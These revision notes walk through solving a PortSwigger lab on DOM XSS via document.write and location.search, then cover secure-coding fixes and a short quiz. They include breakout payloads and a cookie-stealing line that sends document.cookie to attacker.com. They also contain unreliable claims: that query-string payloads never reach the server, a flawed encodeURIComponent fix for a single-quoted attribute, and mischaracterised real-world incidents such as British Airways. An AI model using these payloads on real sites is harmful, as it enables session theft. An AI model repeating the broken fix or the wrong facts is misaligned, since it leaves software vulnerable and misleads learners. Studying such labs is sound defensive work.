DOM XSS in document.write sink using source location.search
Lab Notes for Revision 📝
1. Lab Overview
Detail	Information
Lab Name	DOM XSS in document.write sink using source location.search
Platform	PortSwigger Web Security Academy
Difficulty	APPRENTICE
XSS Type	DOM-based Cross-Site Scripting
2. What is This Vulnerability?
Definition
DOM-based XSS vulnerability where the document.write function writes data from location.search directly to the page without any sanitization/encoding.

Affected Components
Component	Role
Source	location.search - reads data from URL query string
Sink	document.write - writes data directly to HTML document
Vulnerable Code Example
javascript
var query = location.search.substring(1);
document.write("<img src='/resources/images/tracker.gif?searchTerms=" + query + "'>");
3. Why This is Dangerous
Attack Flow Diagram
text
User Clicks Malicious Link
         ↓
URL contains payload in ?search= parameter
         ↓
location.search reads the payload
         ↓
document.write writes payload to page
         ↓
Browser executes malicious JavaScript
         ↓
Attacker achieves: Cookie theft, session hijacking, etc.
Real-World Impact
Attack	Payload Example	Consequence
Cookie Stealing	fetch('https://attacker.com?c='+document.cookie)	Account takeover
Keylogging	document.addEventListener('keypress',...	Password theft
Phishing	document.body.innerHTML=...	Credential harvesting
Malware	window.location='evil.com/virus.exe'	System compromise
Defacement	document.body.innerHTML='Hacked'	Reputation damage
4. How to Exploit (Step by Step)
Step 1: Identify the Vulnerability
Enter random string in search box (e.g., test123)

Right-click → Inspect Element

Observe that your input appears inside an img src attribute

html
<img src="/resources/images/tracker.gif?searchTerms=test123">
Step 2: Understand the Context
Your input is inside src="..." attribute

Need to break out of the attribute and tag

Then inject your own HTML/JavaScript

Step 3: Craft the Payload
text
"><svg onload=alert(1)>
Step 4: Payload Breakdown
Character	Purpose	Explanation
"	Close src attribute	Ends the src="..."
>	Close img tag	Ends the <img> element
<svg onload=alert(1)>	New SVG element	Creates element that triggers alert when loaded
Step 5: URL Construction
text
https://YOUR-LAB-ID.web-security-academy.net/?search="><svg onload=alert(1)>
Step 6: Execute
Paste the malicious URL in browser

Press Enter

Alert popup appears → Lab solved ✅

5. Alternative Payloads
Working Payloads for This Lab
html
"><img src=x onerror=alert(1)>
html
"><body onload=alert(1)>
html
"><script>alert(1)</script>
html
" onerror=alert(1) src=x
Payloads for Different Contexts
Context	Payload
Inside attribute	" onmouseover=alert(1) "
Inside JavaScript	"; alert(1); var x="
Inside HTML tag	><img src=x onerror=alert(1)>
6. Code Analysis (Vulnerable vs Secure)
Vulnerable Code ❌
javascript
// No encoding - DANGEROUS!
var searchTerm = location.search.split('=')[1];
document.write("<img src='/track?q=" + searchTerm + "'>");
Why dangerous: Attacker can inject "><script>... to break out

Secure Code ✅
Method 1: Use textContent

javascript
var searchTerm = location.search.split('=')[1];
document.getElementById("output").textContent = searchTerm;
Method 2: Encode output

javascript
var searchTerm = location.search.split('=')[1];
var encoded = encodeURIComponent(searchTerm);
document.write("<img src='/track?q=" + encoded + "'>");
Method 3: Create elements properly

javascript
var searchTerm = location.search.split('=')[1];
var img = new Image();
img.src = '/track?q=' + encodeURIComponent(searchTerm);
document.body.appendChild(img);
Method 4: Use DOMPurify

javascript
var searchTerm = location.search.split('=')[1];
document.write(DOMPurify.sanitize("<img src='/track?q=" + searchTerm + "'>"));
7. Testing Methodology for Similar Vulnerabilities
Manual Testing Steps
text
[ ] Step 1: Find input that gets reflected in page
[ ] Step 2: Check if inside HTML tag or attribute
[ ] Step 3: Try to break out with quotes and angle brackets
[ ] Step 4: Inject simple alert(1) payload
[ ] Step 5: If blocked, try event handler payloads
[ ] Step 6: Document findings
Test Strings for Different Sinks
Sink	Test String
document.write	"><svg onload=alert(1)>
innerHTML	<img src=x onerror=alert(1)>
eval()	alert(1)
setTimeout	alert(1)
location.href	javascript:alert(1)
8. Key Concepts to Remember
Important Terminology
Term	Definition
Source	Where user input comes from (location.search, document.referrer, etc.)
Sink	Where data is written (document.write, innerHTML, eval, etc.)
DOM XSS	XSS that occurs entirely in client-side JavaScript
Taint Flow	Path from source to sink without sanitization
Why DOM XSS is Unique
Server never sees the attack payload

WAF (Web Application Firewall) cannot detect it

Logs won't show the attack

Client-side only protection needed

location.search vs Other Sources
Source	Data	Example
location.search	Query string	?search=test
location.hash	Fragment identifier	#section1
location.href	Full URL	https://site.com/test
document.referrer	Previous page URL	https://google.com
document.cookie	Cookies	sessionId=abc123
9. Real-World Incidents
British Airways (2018)
DOM XSS in third-party script (Modernizr)

380,000 customer credit cards stolen

£183 million fine

eBay (2014)
DOM XSS in product search

Attackers could steal session cookies

Account takeover possible

Yahoo Mail (2015)
DOM XSS in email rendering

Malicious email could execute JavaScript

Attacker could read all emails

10. Prevention Cheat Sheet
DO's ✅
Practice	Example
Use textContent instead of innerHTML	element.textContent = userInput
Encode output	encodeURIComponent(userInput)
Use safe DOM methods	createElement(), setAttribute()
Content Security Policy (CSP)	script-src 'self'
Input validation	Whitelist allowed characters
DON'Ts ❌
Practice	Why Dangerous
document.write(userInput)	Direct HTML injection
element.innerHTML = userInput	XSS via HTML tags
eval(userInput)	JavaScript injection
location.href = userInput	JavaScript: protocol injection
11. Quick Revision Quiz
Q1: Which JavaScript function is the sink in this lab?

<details> <summary>Answer</summary> `document.write` </details>
Q2: What is the source of user input in this lab?

<details> <summary>Answer</summary> `location.search` </details>
Q3: Why use "><svg onload=alert(1)> instead of <script>alert(1)</script>?

<details> <summary>Answer</summary> Because input is inside img tag's src attribute. Need to close the attribute and tag first. </details>
Q4: Can WAF detect DOM XSS?

<details> <summary>Answer</summary> No, because payload never reaches the server. Attack executes entirely on client side. </details>
Q5: Name two safe alternatives to document.write

<details> <summary>Answer</summary> 1. `textContent` property 2. Creating elements with `createElement()` </details>
12. Lab Solution Summary (One-Line)
text
https://LAB-ID.web-security-academy.net/?search="><svg onload=alert(1)>
13. Key Takeaways
DOM XSS = Attack executes in browser, server unaware

document.write = Dangerous sink when used with user input

location.search = User-controlled source from URL

Context matters = Payload depends on where input is placed

Break out first = Close attributes/tags before injecting

Alert is proof = Real attackers use malicious payloads

Prevention = Avoid document.write, use encoding/safe APIs

14. Further Practice Resources
Platform	Link	Focus
PortSwigger	DOM XSS labs	Different sources/sinks
XSS Game	xss-game.appspot.com	Level 3 - DOM XSS
TryHackMe	DOM-Based XSS room	Interactive learning
